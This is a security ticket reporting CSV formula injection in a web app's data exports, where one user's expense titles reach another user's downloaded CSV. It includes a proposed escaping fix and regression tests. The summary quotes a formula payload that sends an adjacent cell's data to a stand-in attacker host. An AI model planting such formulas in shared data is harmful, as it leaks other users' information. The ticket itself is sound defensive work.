# TICKET-03 — CSV formula injection in data exports (cross-user reach)

**Severity:** Medium (client-side code/command execution in the victim's spreadsheet app)
**Type:** Injection (CSV / formula / DDE)
**Components:** `comaney/csv_export.py`, `feusers/views/account.py` (`account_export`),
`buddies/services/export.py`, `budget/views/expenses.py` (`expenses_export`)

## Summary

Exports write user-controlled text fields (expense `title`, `payee`, `note`,
category/tag titles, dummy `display_name`) into CSV cells verbatim. If a cell value
begins with `=`, `+`, `-`, `@`, or a tab/carriage-return, Excel and LibreOffice Calc
interpret it as a formula when the file is opened. This enables formula injection and,
in some configurations, DDE command execution or data exfiltration via `HYPERLINK`/
`WEBSERVICE`.

The important part: this is not just self-inflicted. The account export
(`account_export`) and the project/buddy exports include expenses and member names
authored by **other** users. A malicious member of a shared project can set an expense
title such as:

```
=HYPERLINK("https://evil.example/"&C2,"click me")
```

or a classic DDE payload, and it will be embedded unescaped in **another** project
member's downloaded `projects/<id>/...csv`.

## Root cause

`comaney/csv_export.py`:

```python
for obj in qs:
    row = []
    for field in fields:
        value = getattr(obj, field.attname)
        ...
        row.append("" if value is None else value)   # written raw
    ...
    w.writerow(row)
```

The same raw pattern is used in the hand-rolled writers in
`buddies/services/export.py`, `feusers/views/account.py`, and
`budget/views/expenses.py:expenses_export`. No cell is prefixed/escaped for the
formula metacharacters.

## Proposed fix

Neutralize formula-triggering leading characters at the single choke point and reuse
it everywhere a CSV cell is written from model data.

```python
_FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")

def _csv_safe(value):
    if isinstance(value, str) and value and value[0] in _FORMULA_PREFIXES:
        return "'" + value        # leading apostrophe: Excel/Calc treat cell as text
    return value
```

Apply `_csv_safe(...)` to every string cell in:
- `write_model_csv` (wrap the `row.append(...)` value),
- the manual `w.writerow([...])` calls in `account_export`, `expenses_export`, and
  `buddies/services/export.py` (member names, titles, payees, notes).

The leading-apostrophe approach preserves the visible value while forcing text
interpretation. (Alternative: wrap risky values in quotes and prefix with `'` only —
apostrophe alone is sufficient and least surprising.)

Numeric/decimal/date columns don't need wrapping; limit escaping to string fields.

## Regression testing

- **Unit**: call `write_model_csv` (and the manual writers) over objects whose
  `title`/`payee`/`note` start with each of `= + - @` and a leading tab; assert the
  emitted cell starts with `'` (or is otherwise neutralized) and that benign values
  (`"Groceries"`, `"-5 not first char? e.g. a-b"`) are unchanged where they shouldn't
  be touched. Note: a value that legitimately starts with `-` (e.g. a negative note)
  will gain a leading apostrophe — confirm that is acceptable to product.
- **Cross-user integration**: user A creates a shared project expense titled
  `=1+1`; user B exports the project; assert B's CSV cell is neutralized.
- **Round-trip**: confirm the CSVs still import/parse correctly (values readable as
  text, apostrophe stripped by spreadsheet apps on display).
